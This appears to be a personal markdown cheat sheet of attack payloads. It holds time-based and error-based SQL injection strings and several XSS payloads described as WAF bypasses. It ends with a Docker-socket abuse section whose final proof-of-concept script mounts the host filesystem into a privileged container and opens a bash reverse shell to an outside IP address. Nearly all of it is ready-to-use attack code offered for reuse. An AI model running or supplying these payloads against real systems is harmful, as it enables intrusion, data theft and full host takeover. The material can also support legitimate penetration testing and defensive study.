## Just a useless set of payload used by me. Saved here for remembrance.

### SQL Injection
#### Time Based Blind:
 - `(select(if(user()like(user()),sleep(4),sleep(2))))` (Timed Based Blind)
 - `x'.and.(select.count(*).from.shouldNotExistTable)=1.or.'1'='0.` (this is for error based sqli and should return error like : "Table 'x.shouldNotExistTable' doesn't exist")
 - `x' AND (SELECT 4321 FROM (SELECT(SLEEP(2-(IF(20=20,0,5)))))x)-- asd` (Timed Based Blind)
 - `x' AND (SELECT 2312 FROM (SELECT(SLEEP(2)))asd)-- dsa` (Timed Based Blind)

### Cross Site Scripting
 - `[document.domain].find(confirm)` (helped me to bypass WAFs/filters or useful if input is echoed or used as variable in js files)
 - `['h0nus'].find(window[String.fromCharCode(97,108,101,114,116)])` (pops an alert with h0nus string :) useful for waf bypasses or evade checks)
 - `('asd').link(eval("var asd=new Function('return prompt(\"h0nus\")'); asd();"))` (pops a prompt with h0nus string )
 - `('asd').anchor(prompt());` (just pops a prompt) 

### XML External Entity
 -  `<![CDATA[ <script>prompt(2)</script> ]]>` (Sometimes WAFS block by keywords like DOCTYPE, ENTITY & ect, but you can inject into `<![CDATA[X]]>` )

### PWN scripts/tips
* Docker:
  * Get all containers or images:
    * `curl -i -s --unix-socket /var/run/docker.sock -X GET http://localhost/containers/json`

  * Create a new container
    * `curl -i -s --unix-socket /var/run/docker.sock -X POST \
    -H "Content-Type: application/json" \
    --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["bash", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
    http://localhost/containers/container_id/exec`

  * Start the newer container with the command
    * `curl -i -s --unix-socket /var/run/docker.sock -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"Detach": false,"Tty": false}' \
    http://localhost/exec/exec_id/start`
    
  * Final PoC:
    * `#!/bin/bash
    pay="bash -c 'bash -i >& /dev/tcp/10.10.14.194/7777 0>&1'"
    payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$pay\\\"\"]"
    response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
    revShellContainerID=$(echo "$response" | cut -d'"' -f4)
    curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start
    sleep 1
    curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"`
